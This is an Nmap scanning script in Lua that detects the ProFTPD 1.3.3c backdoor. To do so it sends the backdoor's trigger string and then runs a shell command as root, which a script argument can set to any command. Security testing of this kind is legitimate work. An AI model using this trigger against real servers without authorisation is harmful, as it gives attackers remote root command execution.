-- -*- mode: lua -*-
-- vim: set filetype=lua :

description = [[
This script tests ProFTPD 1.3.3c for the presence of the
backdoor which was reported as OSVDB-ID 69562.

It allows the remote execution of commands in a root shell. The command that is
executed by default is <code>id</code>, but that can be changed via script-args.
]]

---
-- @usage
-- nmap --script proftp-backdoor -p 21 <host>
--
-- @args proftp-backdoor.cmd Command to execute in shell (default is "id").
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | proftp-backdoor:
-- |   This installation has been backdoored.
-- |   Command: id
-- |   Results: uid=0(root) gid=0(wheel) groups=0(wheel)
-- |_

author = "Mak Kolybabi"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

require("shortport")
require("stdnse")

local CMD_FTP = "HELP ACIDBITCHEZ"
local CMD_SHELL = "id"

portrule = shortport.port_or_service(21, "ftp")

action = function(host, port)
	local cmd, err, line, req, resp, results, sock, status

	cmd = stdnse.get_script_args("proftp-backdoor.cmd")
	if not cmd then
		cmd = CMD_SHELL
	end


	-- Create socket.
	sock = nmap.new_socket("tcp")
	sock:set_timeout(5000)
	status, err = sock:connect(host, port, "tcp")
	if not status then
		stdnse.print_debug(1, "Can't connect: %s", err)
		sock:close()
		return
	end

	-- Read banner.
	status, resp = sock:receive_lines(1)
	if not status then
		stdnse.print_debug(1, "Can't read banner: %s", resp)
		sock:close()
		return
	end

	-- Check version.
	if not resp:match("ProFTPD 1.3.3c") then
		stdnse.print_debug(1, "This version is not known to be backdoored.")
		return
	end

	-- Send command to escalate privilege.
	status, err = sock:send(CMD_FTP .. "\r\n")
	if not status then
		stdnse.print_debug(1, "Failed to send privilege escalation command: %s", err)
		sock:close()
		return
	end

	-- Send command(s) to shell, assuming that privilege escalation worked.
	status, err = sock:send(cmd .. ";\r\n")
	if not status then
		stdnse.print_debug(1, "Failed to send shell command(s): %s", err)
		sock:close()
		return
	end

	-- Check for an error from command.
	status, resp = sock:receive()
	if not status then
		stdnse.print_debug(1, "Can't read command response: %s", resp)
		sock:close()
		return
	elseif resp:match("502 Unknown command") then
		stdnse.print_debug(1, "Privilege escalation failed: %s", resp)
		sock:close()
		return
	end

	-- Summarize the results.
	results = {
	   "This installation has been backdoored.",
	   "Command: " .. CMD_SHELL,
	   "Results: " .. resp
	}

	return stdnse.format_output(true, results)
end
